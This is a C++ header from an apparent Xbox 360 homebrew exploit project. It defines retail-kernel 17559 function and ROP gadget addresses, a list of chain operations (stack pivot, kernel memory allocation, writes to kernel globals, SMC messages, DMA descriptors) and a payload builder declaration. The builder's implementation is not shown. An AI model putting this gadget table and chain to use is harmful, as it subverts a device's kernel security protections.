#pragma once

#include <array>
#include <cstddef>
#include <cstdint>
#include <string_view>

namespace bandwagon::flash_dma {

inline constexpr std::size_t kPayloadSize = 0x4000;
inline constexpr std::uint32_t kPayloadBase = 0x801ca000;
inline constexpr std::uint32_t kStage2RopBase = 0x7a020000;

// Retail 17559 addresses independently corroborated by the pinned public
// Xbox360BadUpdate kernel configuration. The two unnamed globals deliberately
// remain unnamed until stronger evidence identifies their private structures.
struct Retail17559Symbols {
  std::uint32_t mi_allocate_mapped_memory = 0x80080d28;
  std::uint32_t mm_system_pfn_region = 0x80170880;
  std::uint32_t ke_set_current_stack_pointers = 0x80075e70;
  std::uint32_t hal_send_smc_message = 0x80067f48;
  std::uint32_t ke_stall_execution_processor = 0x80073484;
  std::uint32_t io_synchronous_fsd_request = 0x8006b928;

  std::uint32_t restgprlr_25 = 0x80061b70;
  std::uint32_t restgprlr_29 = 0x800619b4;
  std::uint32_t restgprlr_31 = 0x800664b0;
  std::uint32_t store_r3 = 0x800d986c;
  std::uint32_t move_r31_to_r3 = 0x800661e4;
  std::uint32_t move_r31_to_r11 = 0x800c8748;
  std::uint32_t call_dispatch = 0x8007b0ac;
  std::uint32_t stack_pivot_entry = 0x800d27a0;
  std::uint32_t call_preload = 0x800f68cc;
  std::uint32_t load_add_store_r3_r4_on_r11 = 0x80129b7c;
  std::uint32_t load_r3_from_r3 = 0x80130f60;
  std::uint32_t load_r11_from_r3 = 0x80131e38;
  std::uint32_t store_r11_on_r3 = 0x800c6690;

  std::uint32_t unresolved_global_801c7f80 = 0x801c7f80;
  std::uint32_t unresolved_global_801a614c = 0x801a614c;
};

enum class OperationKind {
  kSwitchToPayloadStack,
  kPrepareRopStack,
  kAllocateMappedMemory,
  kCaptureAllocationResult,
  kUpdateUnresolvedKernelGlobal,
  kCopyUnresolvedKernelGlobalValue,
  kIssueSynchronousFsdRequest,
  kRestoreStage2Stack,
  kSendSmcMessage,
  kStallProcessor,
  kDefineDmaDescriptor,
  kProvideScratchSector,
};

struct Operation {
  OperationKind kind;
  std::uint32_t image_offset;
  std::uint32_t operand0;
  std::uint32_t operand1;
};

// A readable inventory of the recovered behavior. It is intentionally
// separate from the byte serializer so callers can inspect intent without
// interpreting ROP save-frame offsets.
const std::array<Operation, 14>& FlashDmaOperations();
std::string_view OperationName(OperationKind kind);

// Builds the complete sparse, big-endian 16 KiB payload. ROP frames are data,
// not sequential instructions, and are emitted through named construction
// phases in payload_builder.cpp.
std::array<std::uint8_t, kPayloadSize> BuildFlashDmaPayload(
    const Retail17559Symbols& symbols = {});

}  // namespace bandwagon::flash_dma
